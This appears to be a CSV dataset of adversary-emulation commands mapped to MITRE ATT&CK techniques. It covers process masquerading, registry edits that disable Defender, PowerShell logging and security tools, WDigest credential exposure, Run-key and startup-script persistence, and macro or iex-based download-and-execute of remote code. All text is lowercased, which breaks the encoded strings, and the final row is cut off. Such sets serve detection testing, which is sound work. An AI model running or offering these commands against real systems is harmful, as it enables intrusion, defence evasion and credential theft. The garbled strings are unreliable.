mitre_id,technique_name,command
T1036,Creating W32Time similar named service using schtasks,"schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\t1036.004_nonexistingscript.ps1"" /tn win32times /f schtasks /query /tn win32times"
T1036,Creating W32Time similar named service using sc,"sc create win32times binpath= ""cmd /c start c:\t1036.004_nonexistingscript.ps1"" sc qc win32times"
T1036,linux rename /proc/pid/comm using prctl,"#{exe_path} & ps tmp=`ps | grep totally_legit` if [ -z ""${tmp}"" ] ; then echo ""renamed process not found in process list"" && exit 1; fi exit 0"
T1036,Hiding a malicious process with bind mounts,"eval '(while true; do :; done) &' echo $! > /tmp/evil_pid.txt random_kernel_pid=$(ps -ef | grep ""\[.*\]"" | awk '{print $2}' | shuf -n 1) sudo mount -b /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)"
T1553,Code Signing Policy Modification,bcdedit /set testsigning on
T1036,Masquerading as Windows LSASS process,copy %systemroot%\system32\cmd.exe %systemroot%\temp\lsass.exe %systemroot%\temp\lsass.exe /b
T1036,Masquerading as FreeBSD or Linux crond process.,cp /bin/sh /tmp/crond; echo 'sleep 5' | /tmp/crond
T1036,Masquerading - cscript.exe running as notepad.exe,copy %systemroot%\system32\cscript.exe %appdata%\notepad.exe /y cmd.exe /c %appdata%\notepad.exe /b
T1036,Masquerading - wscript.exe running as svchost.exe,"copy %systemroot%\system32\wscript.exe %appdata%\svchost.exe /y cmd.exe /c %appdata%\svchost.exe ""pathtoatomicsfolder\..\externalpayloads\t1036.003\src\t1036.003_masquerading.vbs"""
T1036,Masquerading - powershell.exe running as taskhostw.exe,copy %windir%\system32\windowspowershell\v1.0\powershell.exe %appdata%\taskhostw.exe /y cmd.exe /k %appdata%\taskhostw.exe
T1036,Masquerading - non-windows exe running as windows exe,"copy ""#{inputfile}"" #{outputfile} try { $myt1036_003 = (start-process -passthru -filepath #{outputfile}).id } catch { $_; exit $_.exception.hresult} stop-process -id $myt1036_003"
T1036,Masquerading - windows exe running as different windows exe,"copy ""#{inputfile}"" #{outputfile} $myt1036_003 = (start-process -passthru -filepath #{outputfile}).id stop-process -id $myt1036_003"
T1036,Malicious process Masquerading as LSM.exe,copy c:\windows\system32\cmd.exe c:\lsm.exe c:\lsm.exe /c echo t1036.003 > c:\t1036.003.txt
T1027,Decode Eicar File and Write to File,"$encodedstring = ""wdvpivalqefqwzrcufpyntqouf4pn0ndktd9jevjq0fslvnuqu5eqvjelufovelwsvjvuy1urvnuluzjteuhjegrsco="" $bytes = [system.convert]::frombase64string($encodedstring) $decodedstring = [system.text.encoding]::utf8.getstring($bytes) #write the decoded eicar string to file $decodedstring | out-file t1027.013_decodedeicar.txt"
T1027,Decrypt Eicar File and Write to File,"$encryptedstring = ""76492d1116743f0423413b16050a5345mgb8agkaswa0ahmabwbxafoaagbkafoatabxagiadaa5afcawab1afmanabvaeeapqa9ahwazqbjagmangawadqazaa0agqamqawaduayga4adaamgbmadkazgbjadeanqbjagmanqbiagmanwa2agyanqbmaduanabhagiaygayagmanqa1agqamga5adeanabkaduamgbiagmanga2agmamaaxaduazabjadaaoabjagianaa1aduanwbjadcazqblagqaygaxadeaoqa4agiamwawadmanwawadaanqa2adqaoaa4adkazga4admazqa4adgaoqbiageamaa2admamqayadyamwbiaguamaaxadganaa0adyaoaaxadqanqawaguanwbkadkanabjadcanqaxadgayqa2admanqa4agiayga1adkanqazagiamwaxadyaoaawadqamgbmadcazqbjadyanqa5agianwbkaduaoaayageamgbiadeamqazagqanabkadkazga3admamabiadgaoqaxadaanaa4adcaoqa5adeayqa1adyazaazadqanwa3agyangayadcamaawadeamqa4adeazga5aduaygbmagyanqa3adqazqa4aguamaaxaduanwawagqanabiadmamwa2adganwa0agianwayadmamqbhadkazabhadeanqazadqamgazadeanwaxadaazgaxadkayqa1adeamqa="" $key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 $decrypt = convertto-securestring -string $encryptedstring -key $key $decryptedstring = [runtime.interopservices.marshal]::ptrtostringbstr([runtime.interopservices.marshal]::securestringtobstr($decrypt)) #write the decrypted eicar string to a file $decryptedstring | out-file t1027.013_decryptedeicar.txt"
T1112,Modify Registry of Current User Profile - cmd,reg add hkey_current_user\software\microsoft\windows\currentversion\explorer\advanced /t reg_dword /v hidefileext /d 1 /f
T1112,Modify Registry of Local Machine - cmd,reg add hkey_local_machine\software\microsoft\windows\currentversion\run /t reg_expand_sz /v securityhealth /d #{new_executable} /f
T1112,Modify registry to store logon credentials,reg add hklm\system\currentcontrolset\control\securityproviders\wdigest /v uselogoncredential /t reg_dword /d 1 /f
T1112,Use Powershell to Modify registry to store logon credentials,set-itemproperty -force -path 'hklm:\system\currentcontrolset\control\securityproviders\wdigest' -name 'uselogoncredential' -value '1' -erroraction ignore
T1112,Add domain to Trusted sites Zone,"$key= ""hkcu:\software\microsoft\windows\currentversion\internet settings\zonemap\domains\#{bad_domain}\"" $name =""bad-subdomain"" new-item $key -name $name -force new-itemproperty $key$name -name https -value 2 -type dword; new-itemproperty $key$name -name http -value 2 -type dword; new-itemproperty $key$name -name * -value 2 -type dword;"
T1112,Javascript in registry,"new-itemproperty ""hkcu:\software\microsoft\windows\currentversion\internet settings"" -name t1112 -value ""<script>"""
T1112,Change Powershell Execution Policy to Bypass,set-executionpolicy -executionpolicy bypass -scope localmachine
T1112,BlackByte Ransomware Registry Changes - CMD,cmd.exe /c reg add hklm\software\microsoft\windows\currentversion\policies\system /v localaccounttokenfilterpolicy /t reg_dword /d 1 /f cmd.exe /c reg add hklm\software\microsoft\windows\currentversion\policies\system /v enablelinkedconnections /t reg_dword /d 1 /f cmd.exe /c reg add hklm\system\currentcontrolset\control\filesystem /v longpathsenabled /t reg_dword /d 1 /f
T1112,BlackByte Ransomware Registry Changes - Powershell,"new-itemproperty ""hklm:\software\microsoft\windows\currentversion\policies\system"" -name localaccounttokenfilterpolicy -propertytype dword -value 1 -force new-itemproperty ""hklm:\software\microsoft\windows\currentversion\policies\system"" -name enablelinkedconnections -propertytype dword -value 1 -force new-itemproperty ""hklm:\system\currentcontrolset\control\filesystem"" -name longpathsenabled -propertytype dword -value 1 -force"
T1112,Disable Windows Registry Tool,reg add hkey_current_user\software\microsoft\windows\currentversion\policies\system /v disableregistrytools /t reg_dword /d 1 /f
T1112,Disable Windows CMD application,"new-itemproperty -path ""hkcu:\software\policies\microsoft\windows\system"" -name disablecmd -value 1"
T1112,Disable Windows Task Manager application,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\system"" /v disabletaskmgr /t reg_dword /d 1 /f"
T1112,Disable Windows Notification Center,reg add hkey_current_user\software\policies\microsoft\windows\explorer /v disablenotificationcenter /t reg_dword /d 1 /f
T1112,Disable Windows Shutdown Button,"reg add ""hkey_local_machine\software\microsoft\windows\currentversion\policies\system"" /v shutdownwithoutlogon /t reg_dword /d 0 /f"
T1112,Disable Windows LogOff Button,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nologoff /t reg_dword /d 1 /f reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v startmenulogoff /t reg_dword /d 1 /f"
T1112,Disable Windows Change Password Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\system"" /v disablechangepassword /t reg_dword /d 1 /f"
T1112,Disable Windows Lock Workstation Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\system"" /v disablelockworkstation /t reg_dword /d 1 /f"
T1112,Activate Windows NoDesktop Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nodesktop /t reg_dword /d 1 /f"
T1112,Activate Windows NoRun Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v norun /t reg_dword /d 1 /f"
T1112,Activate Windows NoFind Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nofind /t reg_dword /d 1 /f"
T1112,Activate Windows NoControlPanel Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nocontrolpanel /t reg_dword /d 1 /f"
T1112,Activate Windows NoFileMenu Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nofilemenu /t reg_dword /d 1 /f"
T1112,Activate Windows NoClose Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v noclose /t reg_dword /d 1 /f"
T1112,Activate Windows NoSetTaskbar Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nosettaskbar /t reg_dword /d 1 /f"
T1112,Activate Windows NoTrayContextMenu Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v notraycontextmenu /t reg_dword /d 1 /f"
T1112,Activate Windows NoPropertiesMyDocuments Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nopropertiesmydocuments /t reg_dword /d 1 /f"
T1112,Hide Windows Clock Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hideclock /t reg_dword /d 1 /f"
T1112,Windows HideSCAHealth Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hidescahealth /t reg_dword /d 1 /f"
T1112,Windows HideSCANetwork Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hidescanetwork /t reg_dword /d 1 /f"
T1112,Windows HideSCAPower Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hidescapower /t reg_dword /d 1 /f"
T1112,Windows HideSCAVolume Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hidescavolume /t reg_dword /d 1 /f"
T1112,Windows Modify Show Compress Color And Info Tip Registry,reg add hkcu\software\microsoft\windows\currentversion\explorer\advanced /v showinfotip /t reg_dword /d 0 /f reg add hkcu\software\microsoft\windows\currentversion\explorer\advanced /v showcompcolor /t reg_dword /d 0 /f
T1112,Windows Powershell Logging Disabled,reg add hkcu\software\policies\microsoft\windows\powershell\modulelogging /v enablemodulelogging /t reg_dword /d 0 /f reg add hkcu\software\policies\microsoft\windows\powershell\scriptblocklogging /v enablescriptblocklogging /t reg_dword /d 0 /f reg add hkcu\software\policies\microsoft\windows\powershell\transcription /v enabletranscripting /t reg_dword /d 0 /f reg add hkcu\software\policies\microsoft\windows\powershell /v enablescripts /t reg_dword /d 0 /f reg delete hkcu\software\policies\microsoft\windows\powershell /v enablescripts /f >nul 2>&1
T1112,Windows Add Registry Value to Load Service in Safe Mode without Network,"reg add ""hklm\system\currentcontrolset\control\safeboot\minimal\atomicsafemode"" /ve /t reg_sz /f /d ""service"""
T1112,Windows Add Registry Value to Load Service in Safe Mode with Network,"reg add ""hklm\system\currentcontrolset\control\safeboot\network\atomicsafemode"" /ve /t reg_sz /f /d ""service"""
T1112,Disable Windows Toast Notifications,reg add hkey_current_user\software\microsoft\windows\currentversion\pushnotifications /v toastenabled /t reg_dword /d 0 /f
T1112,Disable Windows Security Center Notifications,reg add hklm\software\wow6432node\microsoft\windows\currentversion\immersiveshell /v useactioncenterexperience /t reg_dword /d 0 /f
T1112,Suppress Win Defender Notifications,"reg add ""hklm\software\policies\microsoft\windows defender\ux configuration"" /v notification_suppress /t reg_dword /d 1 /f"
T1112,Allow RDP Remote Assistance Feature,"reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fallowtogethelp /t reg_dword /d 1 /f"
T1112,NetWire RAT Registry Key Creation,"reg add hkcu\software\microsoft\windows\currentversion\run /v netwire /t reg_sz /d ""c:\users\admin\appdata\roaming\install\host.exe"" /f reg add hkcu\software\netwire /v hostid /t reg_sz /d hostid-kai6ci /f reg add hkcu\software\netwire /v ""install date"" /t reg_sz /d ""2021-08-30 07:17:27"" /f"
T1112,Ursnif Malware Registry Key Creation,reg add hkcu\software\appdatalow\software\microsoft\3a861d62-51e0-15700f2219a4 /v comsxres /t reg_binary /d 72656463616e617279 /f
T1112,Terminal Server Client Connection History Cleared,"reg delete ""hkey_current_user\software\microsoft\terminal server client\default"" /va /f reg delete ""hkey_current_user\software\microsoft\terminal server client\servers"" /f"
T1112,Disable Windows Error Reporting Settings,reg add hklm64\software\policies\microsoft\windows defender\reporting /v disableenhancednotifications /t reg_dword /d 1 /f reg add hklm\software\policies\microsoft\windows defender\reporting /v disableenhancednotifications /t reg_dword /d 1 /f
T1112,DisallowRun Execution Of Certain Applications,"reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer /v disallowrun /t reg_dword /d 1 /f reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowrun /f /t reg_sz /v art1 /d ""regedit.exe"" reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowrun /f /t reg_sz /v art2 /d ""cmd.exe"""
T1112,Enabling Restricted Admin Mode via Command_Prompt,"reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v disablerestrictedadmin /t reg_dword /d 0"
T1112,Mimic Ransomware - Enable Multiple User Sessions,reg add hkey_current_user\software\microsoft\windows\currentversion\winlogon /t reg_dword /v allowmultipletssessions /d 1 /f
T1112,Mimic Ransomware - Allow Multiple RDP Sessions per User,"reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fsinglesessionperuser /t reg_dword /d 0 /f"
T1112,Event Viewer Registry Modification - Redirection URL,"reg add ""hklm\software\microsoft\windows nt\currentversion\event viewer"" /v microsoftredirectionurl /t reg_sz /d ""#{redirection_url}"" /f"
T1112,Event Viewer Registry Modification - Redirection Program,"reg add ""hklm\software\microsoft\windows nt\currentversion\event viewer"" /v microsoftredirectionprogram /t reg_expand_sz /d ""#{redirection_program}"" /f"
T1112,Enabling Remote Desktop Protocol via Remote Registry,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v securitylayer /t reg_dword /d 0 /f"
T1112,Disable Win Defender Notification,"reg add ""hklm\software\policies\microsoft\windows defender security center\notifications"" /v ""disablenotifications"" /t reg_dword /d 1 /f"
T1112,Disable Windows OS Auto Update,"reg add ""hklm\software\policies\microsoft\windows\windowsupdate\au"" /v ""noautoupdate"" /t reg_dword /d 1 /f"
T1112,Disable Windows Auto Reboot for current logon user,"reg add ""hklm\software\policies\microsoft\windows\windowsupdate\au"" /v ""noautorebootwithloggedonusers"" /t reg_dword /d 1 /f"
T1112,Windows Auto Update Option to Notify before download,"reg add ""hklm\software\policies\microsoft\windows\windowsupdate\au"" /v ""auoptions"" /t reg_dword /d 2 /f"
T1112,Do Not Connect To Win Update,"reg add ""hklm\software\policies\microsoft\windows\windowsupdate"" /v ""donotconnecttowindowsupdateinternetlocations"" /t reg_dword /d 1 /f"
T1112,Tamper Win Defender Protection,"reg add ""hklm\software\microsoft\windows defender\features"" /v ""tamperprotection"" /t reg_dword /d 0 /f"
T1112,Snake Malware Registry Blob,"$typicalpath = ""hklm:\software\classes\.wav\openwithprogids""; $randombytes = new-object byte[] 0x1000; (new-object random).nextbytes($randombytes); new-itemproperty -path $typicalpath -name ""atomicsnake"" -value $randombytes -propertytype binary -force | out-null"
T1112,Allow Simultaneous Download Registry,"reg add ""hkcu\software\microsoft\windows\currentversion\internet settings"" /v ""maxconnectionsperserver"" /t reg_dword /d 10 /f reg add ""hkcu\software\microsoft\windows\currentversion\internet settings"" /v ""maxconnectionsper1_0server"" /t reg_dword /d 10 /f"
T1112,Modify Internet Zone Protocol Defaults in Current User Registry - cmd,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\internet settings\zonemap\protocoldefaults"" /v http /t reg_dword /d 0 /f reg add ""hkey_current_user\software\microsoft\windows\currentversion\internet settings\zonemap\protocoldefaults"" /v https /t reg_dword /d 0 /f"
T1112,Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell,# set the registry values for http and https to 0 set-itemproperty -path 'hkcu:\software\microsoft\windows\currentversion\internet settings\zonemap\protocoldefaults' -name 'http' -value 0 set-itemproperty -path 'hkcu:\software\microsoft\windows\currentversion\internet settings\zonemap\protocoldefaults' -name 'https' -value 0
T1112,Activities To Disable Secondary Authentication Detected By Modified Registry Value.,"reg add ""hklm\software\policies\microsoft\secondaryauthenticationfactor"" /v ""allowsecondaryauthenticationdevice"" /t reg_dword /d 0 /f"
T1112,Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value.,"reg add ""hklm\software\policies\microsoft\fido"" /v ""allowexternaldevicesignon"" /t reg_dword /d 0 /f"
T1112,Scarab Ransomware Defense Evasion Activities,"reg add ""hklm\software\microsoft\windows\currentversion\policies\system\credssp\parameters"" /v allowencryptionoracle /t reg_dword /d 2 /f"
T1112,Disable Remote Desktop Anti-Alias Setting Through Registry,"reg add ""hkey_local_machine\software\policies\microsoft\windows nt\terminal services"" /v ""disableremotedesktopantialias"" /t reg_dword /d 1 /f"
T1112,Disable Remote Desktop Security Settings Through Registry,"reg add ""hkey_local_machine\software\policies\microsoft\windows nt\terminal services"" /v ""disablesecuritysettings"" /t reg_dword /d 1 /f"
T1112,Disabling ShowUI Settings of Windows Error Reporting (WER),"reg add ""hkcu\software\microsoft\windows\windows error reporting"" /v dontshowui /t reg_dword /d 1 /f"
T1112,Enable Proxy Settings,"reg add ""hkcu\software\microsoft\windows\currentversion\internet settings"" /v proxyenable /t reg_dword /d 1 /f"
T1112,Set-Up Proxy Server,"reg add ""hkcu\software\microsoft\windows\currentversion\internet settings"" /v proxyserver /t reg_sz /d ""proxy.atomic-test.com:8080"" /f"
T1112,RDP Authentication Level Override,"reg add ""hkcu\software\microsoft\terminal server client"" /v authenticationleveloverride /t reg_dword /d 0 /f"
T1112,Enable RDP via Registry (fDenyTSConnections),"reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fdenytsconnections /t reg_dword /d 0 /f"
T1112,Disable Windows Prefetch Through Registry,"reg add ""hklm\system\currentcontrolset\control\session manager\memory management\prefetchparameters"" /v ""enableprefetcher"" /t reg_dword /d 0 /f"
T1112,Setting Shadow key in Registry for RDP Shadowing,"$s= new-cimsession -computername #{server_name} -sessionoption (new-cimsessionoption -protocol dcom) get-ciminstance -namespace root\standardcimv2 -classname msft_netfirewallrule -filter 'displayname=""remote desktop - shadow (tcp-in)""' -cimsession $s | invoke-cimmethod -methodname enable invoke-cimmethod -classname stdregprov -methodname setdwordvalue -arguments @{hdefkey=[uint32]2147483650; ssubkeyname=""software\policies\microsoft\windows nt\terminal services""; svaluename=""shadow""; uvalue=[uint32]2} -cimsession $s"
T1112,Flush Shimcache,"rundll32.exe apphelp.dll,shimflushcache"
T1112,Disable Windows Remote Desktop Protocol,"reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fdenytsconnections /t reg_dword /d 1 /f"
T1112,Enforce Smart Card Authentication Through Registry,"reg add ""hklm\software\microsoft\windows\currentversion\policies\system"" /v scforceoption /t reg_dword /d 1 /f"
T1112,Requires the BitLocker PIN for Pre-boot authentication,"reg add ""hklm\software\policies\microsoft\fve"" /v useadvancedstartup /t reg_dword /d 1 /f"
T1112,Modify EnableBDEWithNoTPM Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v enablebdewithnotpm /t reg_dword /d 1 /f"
T1112,Modify UseTPM Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usetpm /t reg_dword /d 2 /f"
T1112,Modify UseTPMPIN Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usetpmpin /t reg_dword /d 2 /f"
T1112,Modify UseTPMKey Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usetpmkey /t reg_dword /d 2 /f"
T1112,Modify UseTPMKeyPIN Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usetpmkeypin /t reg_dword /d 2 /f"
T1112,Modify EnableNonTPM Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v enablenontpm /t reg_dword /d 1 /f"
T1112,Modify UsePartialEncryptionKey Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usepartialencryptionkey /t reg_dword /d 2 /f"
T1112,Modify UsePIN Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usepin /t reg_dword /d 2 /f"
T1112,Abusing Windows TelemetryController Registry Key for Persistence,"reg add ""hklm\software\microsoft\windows nt\currentversion\appcompatflags\telemetrycontroller\#{new_key}"" /t reg_sz /v command /d #{new_executable} /f"
T1112,Modify RDP-Tcp Initial Program Registry Entry,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v finheritinitialprogram /t reg_dword /d 1 /f reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v initialprogram /t reg_sz /d ""c:\windows\system32\notepad.exe"" /f"
T1112,Abusing MyComputer Disk Cleanup Path for Persistence,"reg add ""hklm\software\microsoft\windows\currentversion\explorer\mycomputer\cleanuppath"" /t reg_expand_sz /d ""%systemroot%\system32\notepad.exe"" /f"
T1112,Abusing MyComputer Disk Fragmentation Path for Persistence,"reg add ""hklm\software\microsoft\windows\currentversion\explorer\mycomputer\defragpath"" /t reg_expand_sz /d ""%systemroot%\system32\notepad.exe"" /f"
T1112,Abusing MyComputer Disk Backup Path for Persistence,"reg add ""hklm\software\microsoft\windows\currentversion\explorer\mycomputer\backuppath"" /t reg_expand_sz /d ""%systemroot%\system32\notepad.exe"" /f"
T1112,Adding custom paths for application execution,"reg add ""hkey_local_machine\software\microsoft\windows\currentversion\app paths\#{app_name}"" /t reg_sz /d #{new_path} /f"
T1098,Modify SSH Authorized Keys,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;"
T1543,Launch Agent,if [ ! -d ~/library/launchagents ]; then mkdir ~/library/launchagents; fi; sudo cp #{path_malicious_plist} ~/library/launchagents/#{plist_filename} sudo launchctl load -w ~/library/launchagents/#{plist_filename}
T1543,Event Monitor Daemon Persistence,sudo cp #{script_location} #{script_destination} sudo touch /private/var/db/emondclients/#{empty_file}
T1543,Launch Agent - Root Directory,sudo cp #{path_malicious_plist} /library/launchagents/#{plist_filename} launchctl load -w /library/launchagents/#{plist_filename}
T1547,Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,"$oldvalue = $(get-itemproperty hklm:\system\currentcontrolset\control\lsa -name 'security packages' | select-object -expandproperty 'security packages'); set-itemproperty -path ""hklm:\system\currentcontrolset\control\lsa"" -name 'security packages old' -value ""$oldvalue""; $newvalue = ""atomictest.dll""; set-itemproperty hklm:\system\currentcontrolset\control\lsa -name 'security packages' -value $newvalue"
T1547,Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,"$oldvalue = $(get-itemproperty hklm:\system\currentcontrolset\control\lsa\osconfig -name 'security packages' | select-object -expandproperty 'security packages'); set-itemproperty -path ""hklm:\system\currentcontrolset\control\lsa\osconfig"" -name 'security packages old' -value ""$oldvalue""; $newvalue = ""atomictest.dll""; set-itemproperty hklm:\system\currentcontrolset\control\lsa\osconfig -name 'security packages' -value $newvalue"
T1037,rc.common,"sudo echo osascript -e 'tell app ""finder"" to display dialog ""hello world""' >> /etc/rc.common"
T1037,rc.common,"filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmuy29tbw9uid4gl3rtcc9umtazny4wmdqucmmuy29tbw9ujykk'))\"""" | sudo tee -a /etc/rc.common printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common sudo chmod +x /etc/rc.common"
T1037,rc.local,"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi [ ""$(uname)"" = 'freebsd' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmubg9jywwgpiavdg1wl1qxmdm3ljawnc5yyy5sb2nhbccpcgo='))\"""" | sudo tee -a /etc/rc.local printf 'exit 0' | sudo tee -a /etc/rc.local sudo chmod +x /etc/rc.local"
T1204,OSTap Style Macro Execution,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n shell`$ `""cscript.exe #{jse_path}`""`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1204,OSTap Payload Download,"echo var url = ""#{file_url}"", fso = wscript.createobject('scripting.filesystemobject'), request, stream; request = wscript.createobject('msxml2.serverxmlhttp'); request.open('get', url, false); request.send(); if (request.status === 200) {stream = wscript.createobject('adodb.stream'); stream.open(); stream.type = 1; stream.write(request.responsebody); stream.position = 0; stream.savetofile('ostapout.txt', 1); stream.close();} else {wscript.quit(1);}wscript.quit(0); > #{script_file} cscript //e:jscript #{script_file}"
T1204,Maldoc choice flags command execution,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" a = shell(`""cmd.exe /c choice /c y /n /d y /t 3`"", vbnormalfocus)"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1204,OSTAP JS version,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n a = shell(`""cmd.exe /c wscript.exe //e:jscript #{jse_path}`"", vbnormalfocus)`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1204,Office launching .bat file from AppData,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{bat_path}`"" for output as #1`n write #1, `""calc.exe`""`n close #1`n a = shell(`""cmd.exe /c #{bat_path} `"", vbnormalfocus)`n"" invoke-maldoc -macrocode $macrocode -officeproduct #{ms_product}"
T1204,Excel 4 Macro,"$fname = ""$env:temp\atomic_redteam_x4m_exec.vbs"" $fname1 = ""$env:temp\procexp.exe"" if (test-path $fname) { remove-item $fname remove-item $fname1 } $xlapp = new-object -comobject ""excel.application"" $xlapp.visible = $true $xlapp.displayalerts = $false $xlbook = $xlapp.workbooks.add() $sheet = $xlbook.excel4macrosheets.add() if (""#{uname}"" -ne """") { $sheet.cells.item(1,1) = ""#{uname}"" } else { $sheet.cells.item(1,1) = ""=get.workspace(26)"" } $sheet.cells.item(2,1) = ""procexp.exe"" $sheet.cells.item(3,1) = ""atomic_redteam_x4m_exec.vbs"" $sheet.cells.item(4,1) = ""=if(isnumber(search(`""64`"",get.workspace(1))), goto(a5),)"" $sheet.cells.item(5,1) = ""=fopen(`""c:\users\`""&a1&`""\appdata\local\temp\`""&a3&`""`"", 3)"" $sheet.cells.item(6,1) = ""=fwriteln(a5, `""url = `""`""#{download_url}`""`""`"")"" $sheet.cells.item(7,1) = ""=fwriteln(a5, `""`"")"" $sheet.cells.item(8,1) = ""=fwriteln(a5, `""set winhttp = createobject(`""`""winhttp.winhttprequest.5.1`""`"")`"")"" $sheet.cells.item(9,1) = ""=fwriteln(a5, `""winhttp.open `""`""get`""`"", url, false`"")"" $sheet.cells.item(10,1) = ""=fwriteln(a5, `""winhttp.send`"")"" $sheet.cells.item(11,1) = ""=fwriteln(a5, `""if winhttp.status = 200 then`"")"" $sheet.cells.item(12,1) = ""=fwriteln(a5, `""set ostream = createobject(`""`""adodb.stream`""`"")`"")"" $sheet.cells.item(13,1) = ""=fwriteln(a5, `""ostream.open`"")"" $sheet.cells.item(14,1) = ""=fwriteln(a5, `""ostream.type = 1`"")"" $sheet.cells.item(15,1) = ""=fwriteln(a5, `""ostream.write winhttp.responsebody`"")"" $sheet.cells.item(16,1) = ""=fwriteln(a5, `""ostream.savetofile `""`""c:\users\`""&a1&`""\appdata\local\temp\`""&a2&`""`""`"", 2`"")"" $sheet.cells.item(17,1) = ""=fwriteln(a5, `""ostream.close`"")"" $sheet.cells.item(18,1) = ""=fwriteln(a5, `""end if`"")"" $sheet.cells.item(19,1) = ""=fclose(a5)"" $sheet.cells.item(20,1) = ""=exec(`""explorer.exe c:\users\`""&a1&`""\appdata\local\temp\`""&a3&`""`"")"" $sheet.cells.item(21,1) = ""=wait(now()+`""00:00:05`"")"" $sheet.cells.item(22,1) = ""=exec(`""explorer.exe c:\users\`""&a1&`""\appdata\local\temp\`""&a2&`""`"")"" $sheet.cells.item(23,1) = ""=halt()"" $sheet.cells.item(1,1).name = ""runme"" $xlapp.run(""runme"") $xlapp.quit() 